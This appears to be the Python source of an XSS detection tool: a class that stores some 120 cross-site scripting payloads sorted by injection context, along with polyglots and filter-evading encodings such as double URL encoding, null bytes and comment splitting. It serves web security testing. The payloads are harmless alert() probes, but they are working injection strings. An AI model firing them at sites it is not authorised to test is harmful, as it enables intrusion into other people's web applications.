# Project: BRS-XSS (XSS Detection Suite)
# Company: EasyProTech LLC (www.easypro.tech)
# Dev: Brabus
# Date: Wed 04 Sep 2025 09:03:08 MSK
# Status: Created
# Telegram: https://t.me/EasyProTech

"""
Context matrix for XSS payload generation
Supports 6 contexts: HTML, Attribute, JavaScript, CSS, URI, SVG
"""

from typing import Dict, List, Set, Optional
from enum import Enum


class Context(Enum):
    """XSS injection contexts"""
    HTML = "html"
    ATTRIBUTE = "attribute"
    JAVASCRIPT = "script"
    CSS = "css"
    URI = "uri"
    SVG = "svg"


class ContextMatrix:
    """Matrix-based payload generation for different injection contexts"""
    
    def __init__(self):
        self.context_payloads = self._build_context_matrix()
        self.polyglot_payloads = self._build_polyglot_payloads()
        self.aggr_payloads = self._build_aggr_payloads()
    
    def _build_context_matrix(self) -> Dict[Context, List[str]]:
        """Build context-specific payload matrix"""
        return {
            Context.HTML: [
                # HTML context - tag content
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<marquee onstart=alert(1)>test</marquee>",
                "<audio src=x onerror=alert(1)>",
                "<video src=x onerror=alert(1)>",
                "<!--<script>alert(1)</script>-->",
                "<style>@import'javascript:alert(1)';</style>",
                "<link rel=stylesheet href=javascript:alert(1)>",
                "<base href=javascript:alert(1)//>",
                "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
                "<form><button formaction=javascript:alert(1)>X</button></form>",
                "<object data=javascript:alert(1)>",
                "<embed src=javascript:alert(1)>",
                "<applet code=javascript:alert(1)>",
                "<isindex action=javascript:alert(1)>",
                "<table background=javascript:alert(1)>",
                "<td background=javascript:alert(1)>",
            ],
            
            Context.ATTRIBUTE: [
                # Attribute context - inside HTML attributes
                '" onmouseover="alert(1)"',
                "' onmouseover='alert(1)'",
                '" onfocus="alert(1)" autofocus="',
                "' onfocus='alert(1)' autofocus='",
                '" onload="alert(1)"',
                "' onload='alert(1)'",
                '" onerror="alert(1)"',
                "' onerror='alert(1)'",
                '" onclick="alert(1)"',
                "' onclick='alert(1)'",
                '" onsubmit="alert(1)"',
                "' onsubmit='alert(1)'",
                '" onchange="alert(1)"',
                "' onchange='alert(1)'",
                '" onkeydown="alert(1)"',
                "' onkeydown='alert(1)'",
                '" onresize="alert(1)"',
                "' onresize='alert(1)'",
                '" ondrag="alert(1)"',
                "' ondrag='alert(1)'",
            ],
            
            Context.JAVASCRIPT: [
                # JavaScript context - inside script tags or event handlers
                "alert(1)",
                "confirm(1)",
                "prompt(1)",
                "eval('alert(1)')",
                "setTimeout('alert(1)',0)",
                "setInterval('alert(1)',0)",
                "Function('alert(1)')()",
                "constructor.constructor('alert(1)')()",
                "top['alert'](1)",
                "parent['alert'](1)",
                "self['alert'](1)",
                "window['alert'](1)",
                "frames['alert'](1)",
                "globalThis['alert'](1)",
                "this['alert'](1)",
                "[]['constructor']['constructor']('alert(1)')()",
                "''['constructor']['constructor']('alert(1)')()",
                "({}+{})['constructor']['constructor']('alert(1)')()",
                "location='javascript:alert(1)'",
                "location.href='javascript:alert(1)'",
            ],
            
            Context.CSS: [
                # CSS context - inside style attributes or style tags
                "expression(alert(1))",
                "url('javascript:alert(1)')",
                "@import 'javascript:alert(1)';",
                "behavior:url('javascript:alert(1)')",
                "-moz-binding:url('javascript:alert(1)')",
                "background:url('javascript:alert(1)')",
                "background-image:url('javascript:alert(1)')",
                "list-style-image:url('javascript:alert(1)')",
                "cursor:url('javascript:alert(1)'),auto",
                "content:url('javascript:alert(1)')",
                "font-face{font-family:x;src:url('javascript:alert(1)')}",
                "@font-face{font-family:x;src:url('javascript:alert(1)')}",
                "animation:x 1s;@keyframes x{from{background:url('javascript:alert(1)')}}",
                "transition:all 0s;background:url('javascript:alert(1)')",
                "filter:url('javascript:alert(1)')",
                "mask:url('javascript:alert(1)')",
                "clip-path:url('javascript:alert(1)')",
                "shape-outside:url('javascript:alert(1)')",
                "marker:url('javascript:alert(1)')",
                "stroke:url('javascript:alert(1)')",
            ],
            
            Context.URI: [
                # URI context - inside URL parameters or href attributes
                "javascript:alert(1)",
                "javascript:alert(String.fromCharCode(88,83,83))",
                "javascript:alert(/XSS/)",
                "javascript:alert`1`",
                "javascript:alert(1)//",
                "javascript:alert(1)/**/",
                "javascript:/**/alert(1)",
                "javascript:alert/**/1",
                "javascript:alert(/**/1)",
                "javascript:alert(1/**/)",
                "data:text/html,<script>alert(1)</script>",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
                "data:application/javascript,alert(1)",
                "data:text/javascript,alert(1)",
                "vbscript:msgbox(1)",
                "livescript:alert(1)",
                "mocha:alert(1)",
                "feed:javascript:alert(1)",
                "view-source:javascript:alert(1)",
                "wyciwyg://0/javascript:alert(1)",
            ],
            
            Context.SVG: [
                # SVG context - inside SVG elements
                "<svg onload=alert(1)>",
                "<svg><script>alert(1)</script></svg>",
                "<svg><script href=data:,alert(1) />",
                "<svg><script xlink:href=data:,alert(1) />",
                "<svg><use xlink:href=data:,<svg id=x><script>alert(1)</script></svg>#x />",
                "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
                "<svg><animate onbegin=alert(1) />",
                "<svg><animateTransform onbegin=alert(1) />",
                "<svg><animateMotion onbegin=alert(1) />",
                "<svg><set onbegin=alert(1) />",
                "<svg><image href=javascript:alert(1) />",
                "<svg><image xlink:href=javascript:alert(1) />",
                "<svg><a><text>click<animate onbegin=alert(1) /></text></a></svg>",
                "<svg><defs><script>alert(1)</script></defs></svg>",
                "<svg><symbol><script>alert(1)</script></symbol></svg>",
                "<svg><marker><script>alert(1)</script></marker></svg>",
                "<svg><pattern><script>alert(1)</script></pattern></svg>",
                "<svg><clipPath><script>alert(1)</script></clipPath></svg>",
                "<svg><mask><script>alert(1)</script></mask></svg>",
                "<svg><g onload=alert(1)></g></svg>",
            ]
        }
    
    def _build_polyglot_payloads(self) -> List[str]:
        """Build polyglot payloads that work in multiple contexts"""
        return [
            # Universal polyglots
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "\"><img src=x onerror=alert(1)>",
            "';alert(1);//",
            "\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            "\";alert('XSS');//",
            "';alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            
            # Context-breaking polyglots
            "\"'><img src=x onerror=alert(1)>",
            "\"'><svg onload=alert(1)>",
            "\"'><script>alert(1)</script>",
            "</title><script>alert(1)</script>",
            "</textarea><script>alert(1)</script>",
            "</style><script>alert(1)</script>",
            "</noscript><script>alert(1)</script>",
            "</noembed><script>alert(1)</script>",
            
            # Multi-encoding polyglots
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "&lt;script&gt;alert(1)&lt;/script&gt;",
            "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
            "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
            
            # polyglots
            "<!--<script>alert(1)</script>-->",
            "<![CDATA[<script>alert(1)</script>]]>",
            "<?xml version=\"1.0\"?><script>alert(1)</script>",
        ]
    
    def _build_aggr_payloads(self) -> List[str]:
        """Build aggressive payloads with multi-encoding and techniques"""
        base_payloads = [
            "alert(1)",
            "confirm(1)",
            "prompt(1)",
            "eval('alert(1)')",
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
        ]
        
        encodings = [
            # URL encoding
            lambda p: p.replace('<', '%3C').replace('>', '%3E').replace('"', '%22').replace("'", '%27'),
            # Double URL encoding
            lambda p: p.replace('<', '%253C').replace('>', '%253E').replace('"', '%2522').replace("'", '%2527'),
            # HTML entity encoding
            lambda p: p.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;'),
            # Unicode encoding
            lambda p: p.replace('<', '\\u003c').replace('>', '\\u003e').replace('"', '\\u0022').replace("'", '\\u0027'),
            # Hex encoding
            lambda p: p.replace('<', '\\x3c').replace('>', '\\x3e').replace('"', '\\x22').replace("'", '\\x27'),
            # Mixed case
            lambda p: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p)),
            # With null bytes
            lambda p: p.replace('alert', 'al\\x00ert').replace('script', 'sc\\x00ript'),
            # With comments
            lambda p: p.replace('alert', 'al/**/ert').replace('script', 'sc/**/ript'),
            # With spaces
            lambda p: p.replace('alert', 'al ert').replace('script', 'sc ript'),
            # With tabs
            lambda p: p.replace('alert', 'al\\tert').replace('script', 'sc\\tript'),
        ]
        
        aggr_payloads = []
        for payload in base_payloads:
            # Original payload
            aggr_payloads.append(payload)
            # Apply each encoding
            for encoding in encodings:
                try:
                    encoded = encoding(payload)
                    if encoded != payload:  # Only add if actually different
                        aggr_payloads.append(encoded)
                except Exception:
                    continue
        
        return list(set(aggr_payloads))  # Remove duplicates
    
    def get_context_payloads(self, context: Context) -> List[str]:
        """Get payloads for specific context"""
        return self.context_payloads.get(context, [])
    
    def get_polyglot_payloads(self) -> List[str]:
        """Get polyglot payloads that work in multiple contexts"""
        return self.polyglot_payloads
    
    def get_aggr_payloads(self) -> List[str]:
        """Get aggressive payloads with multi-encoding"""
        return self.aggr_payloads
    
    def get_all_contexts(self) -> Set[Context]:
        """Get all supported contexts"""
        return set(self.context_payloads.keys())
    
    def get_payload_count(self, context: Optional[Context] = None) -> int:
        """Get payload count for context or total"""
        if context:
            return len(self.context_payloads.get(context, []))
        return sum(len(payloads) for payloads in self.context_payloads.values())
    
    def get_total_payload_count(self) -> Dict[str, int]:
        """Get payload statistics"""
        return {
            "context_specific": sum(len(p) for p in self.context_payloads.values()),
            "polyglot": len(self.polyglot_payloads),
            "aggressive": len(self.aggr_payloads),
            "total_unique": len(set(
                sum(self.context_payloads.values(), []) + 
                self.polyglot_payloads + 
                self.aggr_payloads
            ))
        }
